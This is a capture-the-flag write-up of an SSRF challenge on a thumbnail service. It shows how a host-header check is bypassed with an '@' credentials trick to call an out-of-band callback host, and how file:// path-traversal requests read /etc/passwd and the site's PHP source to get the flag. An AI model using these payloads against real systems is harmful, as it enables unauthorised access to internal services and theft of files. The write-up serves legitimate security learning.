## we have a site that get the Thumbnail from internal servers => seems to be ssrf 


**error message if you supplied host header without internalapi.local**
```http
Invalid HOST:-<br />You must choose one of our internal apis internalapi [1:9] only
```
**after check , i found that the only security mechanism that is applied is to check if `internalapi.local` is in the host header**


**i added `@` to make `internalapi.local` as credntials and send request to burp collap and i recived one**
```http
GET /?url=&server=http://internalapi1.local@9z9n3bnobyecs6hahjjcgyx0oruiib60.oastify.com 
```

the response was the same 
![Screenshot_20231007_003149](https://github.com/kiro6/writeups-ctfs/assets/57776872/8b0e82fc-eaaf-4aa6-bdd4-1d621a27872f)

i tried to request the image i found that it is contains the same response from burp collap 
![Screenshot_20231007_003153](https://github.com/kiro6/writeups-ctfs/assets/57776872/b1d64667-fed8-41b0-b38a-8dcc4ea01c36)

**i thought maybe i can the file contents**
```http
GET /?url=&server=file:///internalapi2.local/../../../etc/passwd HTTP/1.1
```
![Screenshot_20231007_002228](https://github.com/kiro6/writeups-ctfs/assets/57776872/00a7cd27-e22b-40d9-8ff7-db5b85fa7d6c)


**boom we did it**
![Screenshot_20231007_002219](https://github.com/kiro6/writeups-ctfs/assets/57776872/96c0aba5-2852-47bb-a714-ce2b5a5c8cdc)


**Notice /var/www  in the /etc/passwd file maybe it is the server path , we can aslo bruteforce other linux systen files that exposure the server path**
```http
GET /?url=&server=file:///internalapi2.local/../../../var/www/html/index.php HTTP/1.1
```
![Screenshot_20231007_002225](https://github.com/kiro6/writeups-ctfs/assets/57776872/9e8ff211-15a7-4edb-98dc-65cbb37722c5)


**boom we did it again we have the source code**
![Screenshot_20231007_002214](https://github.com/kiro6/writeups-ctfs/assets/57776872/5909c3dd-1b54-482f-86fb-b9fe7efc28aa)


**Flage**
```php
$jpeg =  'Server!Host@Flag';
```

